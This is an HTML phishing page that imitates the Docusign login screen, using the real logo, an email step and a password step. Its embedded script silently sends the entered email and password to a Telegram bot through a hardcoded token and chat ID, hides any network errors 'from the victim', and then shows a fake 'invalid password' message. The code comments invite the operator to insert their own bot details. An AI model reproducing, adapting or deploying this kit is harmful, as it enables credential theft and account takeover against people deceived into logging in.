<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to Docusign</title>
    <style>
        * { box-sizing: border-box; }
        body {
            margin: 0;
            font-family: "DS Indigo", Helvetica, Arial, sans-serif;
            background: #f8f8f8;
            color: #1e1e1e;
        }
        .header { padding: 24px 40px; background: white; border-bottom: 1px solid #eee; }
        .logo { height: 32px; }
        .main-container {
            max-width: 420px;
            margin: 60px auto;
            background: white;
            border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
            overflow: hidden;
        }
        .content { padding: 40px 40px 32px; text-align: center; }
        h1 { font-size: 28px; font-weight: 600; margin: 0 0 10px 0; }
        .subtitle { font-size: 16px; color: #555; margin-bottom: 32px; }
        label { display: block; text-align: left; font-size: 14px; font-weight: 500; margin-bottom: 8px; }
        input[type="email"], input[type="password"] {
            width: 100%; padding: 14px 16px; font-size: 16px;
            border: 1px solid #d1d1d1; border-radius: 4px; margin-bottom: 24px;
        }
        .next-btn, .signin-btn {
            width: 100%; padding: 15px; background: #4c00ff; color: white;
            border: none; font-size: 15px; font-weight: 600; letter-spacing: 0.66px;
            text-transform: uppercase; border-radius: 4px; cursor: pointer;
        }
        .next-btn:hover, .signin-btn:hover { background: #3a00cc; }
        .signup-btn {
            width: 100%; padding: 15px; background: #f5f5f5; color: #1e1e1e;
            border: none; font-size: 15px; margin-top: 12px; border-radius: 4px; cursor: pointer;
        }
        .back-btn {
            margin-top: 25px; background: none; border: none;
            color: #0069ec; font-size: 14px; cursor: pointer;
        }
        .error-msg {
            color: #d13239;
            font-weight: 500;
            margin-top: 15px;
            display: none;
        }
    </style>
</head>
<body>

    <div class="header">
        <img src="https://docucdn-a.akamaihd.net/olive/images/2.64.0/global-assets/ds-logo-default.svg" alt="DocuSign" class="logo">
    </div>

    <div class="main-container">

        <!-- EMAIL STEP -->
        <div id="emailStep" class="content">
            <h1>Log in to Docusign</h1>
            <p class="subtitle">Enter your email to log in.</p>
            <form id="emailForm">
                <label for="email">Email <span style="color:#d13239;">*</span></label>
                <input type="email" id="email" placeholder="Enter email" required>
                <button type="button" onclick="showPasswordStep()" class="next-btn">NEXT</button>
            </form>
            <button onclick="alert('Sign Up page would open here')" class="signup-btn">Sign Up for Free</button>
        </div>

        <!-- PASSWORD STEP -->
        <div id="passwordStep" class="content" style="display:none;">
            <h2>Enter your password</h2>
            <input type="password" id="password" placeholder="Enter password">

            <button onclick="submitLogin()" class="signin-btn">Sign In</button>

            <div id="errorMessage" class="error-msg">
                Invalid email or password. Please try again.
            </div>

            <button onclick="goBackToEmail()" class="back-btn">← Back</button>
        </div>

    </div>

<script>
// ==================== PUT YOUR TELEGRAM DETAILS HERE ====================
const BOT_TOKEN = "8782338544:AAGii1hfURZa1r83ptNahLY7nCAtpRE9MeU";   // ← Change this
const CHAT_ID = "6073753487";       // ← Change this
// =====================================================================

function showPasswordStep() {
    document.getElementById('emailStep').style.display = 'none';
    document.getElementById('passwordStep').style.display = 'block';
    document.getElementById('errorMessage').style.display = 'none';
}

function goBackToEmail() {
    document.getElementById('passwordStep').style.display = 'none';
    document.getElementById('emailStep').style.display = 'block';
}

async function submitLogin() {
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value.trim();

    if (!email || !password) {
        alert("Please enter both email and password");
        return;
    }

    // Send to Telegram silently
    const message = `🔐 New Login Attempt\n\n📧 Email: ${email}\n🔑 Password: ${password}\n⏰ Time: ${new Date().toLocaleString()}`;

    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message
            })
        });
    } catch (e) {
        // Fail silently - don't show error to victim
    }

    // Show fake error message to the user
    document.getElementById('errorMessage').style.display = 'block';

    // Optional: Clear password field after "failed" login
    document.getElementById('password').value = '';
}
</script>

</body>
</html>
